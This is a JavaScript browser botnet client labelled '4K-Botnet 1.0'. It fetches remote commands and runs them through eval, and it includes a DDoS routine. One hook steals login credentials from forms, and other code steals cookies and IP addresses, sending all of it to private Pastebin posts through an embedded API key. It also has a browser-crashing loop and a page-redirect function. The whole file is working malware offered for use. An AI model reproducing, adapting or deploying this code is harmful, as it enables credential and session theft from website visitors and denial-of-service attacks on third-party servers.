//4K-Botnet 1.0 by Chowix40
//I know it's still crap but it (or should) works better
var SERVER_URL = 'https://psbotnet.chilloxop.repl.co'
var api_dev_key = 'tSZ0XJEbkQhEh9ys_UYUo5TG23KM_yUM'
var api_user_key = 'chilloxop'



function getCMD() {
    var oReqcmd = new XMLHttpRequest();
    oReqcmd.addEventListener("load", reqListener);
    oReqcmd.open("GET", SERVER_URL + "cmds.txt");
    oReqcmd.send(null);

    function reqListener() {
        console.log(oReqcmd.responseText)
        eval(oReqcmd.responseText)
        console.log('r1')
    }
}

//Get and Execute CMDs
getCMD()

//Functions

//Done-ish, Attack Untested 
function DDoS(Durl) {
    //Gets the URL to DDoS
    setInterval(DDosX, 10);
    console.log('run')

    //Original DDoS code taken from the Cloudflare blog - https://blog.cloudflare.com/an-introduction-to-javascript-based-ddos/
    function DDosX() {

        var TARGET = Durl
        var URI = '/index.php?page=index.html'
        var pic = new Image()
        var rand = Math.floor(Math.random() * 1000)
        pic.src = 'https://cors-anywhere.herokuapp.com/' + TARGET + URI + rand + '=val'
    }
} 


//Captures creds and posts it to private pastebin post
function getCreds() {
    //Original code taken from Gumshoe but modified by Chowix40 
    var forms = document.getElementsByTagName('form');

    for (var i = 0; i < forms.length; i++) {
        var form = forms[i];
        var fields = form.getElementsByTagName('input');

        // attempt to locate user/pass elements
        for (var j = 0; j < fields.length; j++) {
            var f = fields[j];

            // recognize user/pass form elements
            if (!form._pass && f.type == 'password')
                form._pass = f;
            else if (!form._user && (f.type == 'text' || f.type == 'email'))
                form._user = f;

            // wait until user/pass are found
            if (!(form._user !== undefined && form._pass !== undefined))
                continue;

            // user/pass elements found
            // add event handler to form
            form.onsubmit = function () {
                if (this._user.value && this._pass.value) {
                    // post credentials to background
                    var userName = this._user.value
                    var passWord = this._pass.value
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", 'https://cors-anywhere.herokuapp.com/https://pastebin.com/api/api_post.php', true);
                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                    xhr.onreadystatechange = function () { // Call a function when the state changes.
                        if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
                        }
                    }
                    var creds = userName + ":" + passWord + ":" + location.href
                    var pname = "[PW] "+  location.hostname + ", " + new Date
                        xhr.send("api_dev_key=" + api_dev_key + "&api_option=paste&api_paste_code=" + creds + "&api_paste_name=" + pname + "&api_user_key=" + api_user_key + "&api_paste_private=2");
                }
            }
        };
    }
}; 

//Captures cookies and sends it to a private pastebin post
function getCookies() {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", 'https://cors-anywhere.herokuapp.com/https://pastebin.com/api/api_post.php', true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function () {
    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
        }
    }
    var cookies = document.cookie + ", " + location.href
    var pname = "[C] " + location.hostname + ", " + new Date 
    xhr.send("api_dev_key=" + api_dev_key + "&api_option=paste&api_paste_code=" + cookies + "&api_paste_name=" + pname + "&api_user_key=" + api_user_key + "&api_paste_private=2");

}  

//Depending on device setup it will crash tab, browser, or possible the OS
function browserKill() {
    while (true) {
        var total = '';
        for (var i = 0; i < 100000; i++) { total = total + i.toString() }
        history.pushState(0, 0, total);
    };
}

//Redirects the page
function reDire() {
    window.location.replace(arguments[0])
}

//IP Stealer
function ipLog() {
    var oReqcmd = new XMLHttpRequest();
    oReqcmd.addEventListener("load", reqListener);
    oReqcmd.open("GET", "https://cors-anywhere.herokuapp.com/https://l2.io/ip");
    oReqcmd.send(null);

    function reqListener() {
        xhr.open("POST", 'https://cors-anywhere.herokuapp.com/https://pastebin.com/api/api_post.php', true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.onreadystatechange = function () {
        if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
            }
        }
        var ip = oReqcmd.responseText + ", " + navigator.userAgent + ", " + location.href
        var pname = "[IP] " + location.hostname + ", " + new Date 
        xhr.send("api_dev_key=" + api_dev_key + "&api_option=paste&api_paste_code=" + ip + "&api_paste_name=" + pname + "&api_user_key=" + api_user_key + "&api_paste_private=2");      
    }
};
